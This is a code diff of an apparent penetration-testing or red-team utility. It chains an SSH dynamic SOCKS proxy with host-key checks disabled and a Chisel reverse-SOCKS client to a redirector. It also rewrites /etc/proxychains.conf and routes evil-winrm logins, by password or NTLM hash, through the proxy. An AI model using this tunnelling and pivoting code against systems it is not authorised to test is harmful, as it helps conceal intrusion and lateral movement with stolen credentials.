@@ -142,9 +142,11 @@ def setup_socks_tunnel(tunnel_count, target_ip, target_port):
     print("Setting up a SOCKS proxy tunnel...")
 
     if tunnel_count == 1:
-        print(f"SOCKS Proxy Tunnel NOT Supported over single tunnel")
+        print("SOCKS Proxy Tunnel NOT Supported over single tunnel")
         return None, None
+
     elif tunnel_count == 2:
+        # Step 1: Setup SSH tunnel for SOCKS5
         socks_ssh_tunnel_ip = text("Enter SOCKS Server IP:").ask()
         socks_ssh_tunnel_port = text("Enter SOCKS Server SSH Port (default: 22):").ask() or "22"
         socks_ssh_tunnel_user = text("Enter SOCKS Server SSH Username:").ask()
@@ -157,7 +159,6 @@ def setup_socks_tunnel(tunnel_count, target_ip, target_port):
 
         ssh_key_path = os.path.join(ssh_key_directory, ssh_key_name)
 
-        # Command to establish the SOCKS proxy via SSH
         ssh_command = (
             f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
             f"-i {ssh_key_path} -D 127.0.0.1:{local_socks_port} -q -C -N -f "
@@ -167,26 +168,49 @@ def setup_socks_tunnel(tunnel_count, target_ip, target_port):
         execute_command(ssh_command)
         print(f"SOCKS proxy established at 127.0.0.1:{local_socks_port}")
 
-        # Collect required inputs for the second hop (Chisel client connection)
+        # Step 2: Setup Chisel tunnel
         chisel_redirector_ip = text("Enter Redirector IP (Chisel Server):").ask()
         chisel_redirector_port = text("Enter Redirector Port (default: 8000):").ask() or "8000"
         chisel_username = text("Enter SOCKS Proxy Username:").ask()
         chisel_password = text("Enter SOCKS Proxy Password:").ask()
 
-        # Chisel client command using the established SOCKS proxy
         chisel_command = (
-            f"chisel client --proxy socks5h://'{chisel_username}:{chisel_password}'@127.0.0.1:{local_socks_port} "
+            f"chisel client --proxy socks5h://{chisel_username}:{chisel_password}@127.0.0.1:{local_socks_port} "
             f"{chisel_redirector_ip}:{chisel_redirector_port} R:socks &"
         )
         print(f"DEBUG: Executing Chisel client command: {chisel_command}")
         execute_command(chisel_command)
-
         print("Chisel client connected to redirector.")
+
+        # Step 3: Update /etc/proxychains.conf
+        proxychains_config_path = "/etc/proxychains.conf"
+
+        try:
+            # Use sed to remove the socks4 line
+            sed_remove_socks4 = f"sed -i '/^socks4 /d' {proxychains_config_path}"
+            print(f"DEBUG: Executing command to remove socks4 line: {sed_remove_socks4}")
+            execute_command(sed_remove_socks4)
+
+            # Use sed to add or replace the socks5 line
+            sed_update_socks5 = (
+                f"if grep -q '^socks5 ' {proxychains_config_path}; then "
+                f"sed -i 's|^socks5 .*|socks5  127.0.0.1 {local_socks_port}|' {proxychains_config_path}; "
+                f"else echo 'socks5  127.0.0.1 {local_socks_port}' >> {proxychains_config_path}; fi"
+            )
+            print(f"DEBUG: Executing command to update socks5 line: {sed_update_socks5}")
+            execute_command(sed_update_socks5)
+
+            print(f"Updated {proxychains_config_path} to use local SOCKS port: {local_socks_port}")
+
+        except Exception as e:
+            print(f"Error updating {proxychains_config_path}: {e}")
+
         return local_socks_port, None  # Return the SOCKS proxy port
 
     else:
         print("ERROR: Multi-hop SOCKS tunneling is not yet implemented.")
         return None, None
+
 
 def setup_tunnel_chain_dynamic_with_ports(tunnel_count, target_ip, target_port, custom_ports=None):
     """
@@ -323,7 +347,7 @@ def winrm_masq():
             if auth_choice == "Password":
                 winrm_password = input("Enter WinRM Password: ")
                 command = (
-                    f"evil-winrm -i {target_ip} -u {winrm_username} -p {winrm_password}"
+                    f"proxychains evil-winrm -i {target_ip} -u {winrm_username} -p {winrm_password}"
                 )
             elif auth_choice == "Hashes":
                 winrm_hash = input("Enter NTLM Hash: ")
